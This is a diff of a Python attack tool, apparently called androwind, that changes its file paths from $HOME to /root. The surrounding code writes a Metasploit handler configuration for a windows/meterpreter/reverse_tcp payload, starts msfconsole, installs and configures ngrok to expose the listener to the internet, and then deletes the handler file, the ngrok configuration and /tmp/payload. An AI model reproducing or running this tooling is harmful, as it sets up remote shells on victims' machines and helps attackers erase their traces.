@@ -110,7 +110,7 @@ def venom_window(ip, port, filename):
 def msfconsole():
     print(GREEN + " Starting msfconsole..")
     try:
-        os.system("sudo xterm -T Metasploit -e msfconsole -q -r $HOME/.androwind/systemHandler.r")
+        os.system("sudo xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
         os.system("sudo rm systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
         print("Done. Good Bye!")
     except Exception as ex:
@@ -119,7 +119,7 @@ def msfconsole():
 #it create systemHandler.r file for metasploit
 def metaConfig(ip, port):
     try:
-        f = open("$HOME/.androwind/systemHandler.r", "w+")
+        f = open("/root/.androwind/systemHandler.r", "w+")
         f.write("use exploit/multi/handler\n")
         f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
         f.write(f"set LHOST {ip}\n")
@@ -132,7 +132,7 @@ def metaConfig(ip, port):
 # CTRl + S to save file and CTRL + X to go further
 def systemHandler():
     try:
-        os.system("sudo xterm -T Metasploit -e nano $HOME/.androwind/systemHandler.r")
+        os.system("sudo xterm -T Metasploit -e nano /root/.androwind/systemHandler.r")
 
     except Exception as ex:
         print("Exception: %s " %str(ex))
@@ -145,7 +145,7 @@ def ngrok():
             time.sleep(0.1)
             sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Installing ngrok..")
             sys.stdout.flush()
-        os.system("sudo cp $HOME/.androwind/ngrok /usr/local/bin")
+        os.system("sudo cp ngrok /usr/local/bin")
     print("\n" + blue_plus + " Ngrok installed \n")
     print("")
 
@@ -160,7 +160,7 @@ def ngConfig():
     if not os.path.exists(path):
 
         try:
-            os.system(f"sudo mkdir /root/.ngrok2 && sudo cp -f $HOME/.androwind/ngrok.yml /root/.ngrok2/")
+            os.system(f"sudo mkdir /root/.ngrok2 && sudo cp -f /root/.androwind/ngrok.yml /root/.ngrok2/")
 
         except Exception as ex:
             print("Exception: %s " %str(ex))
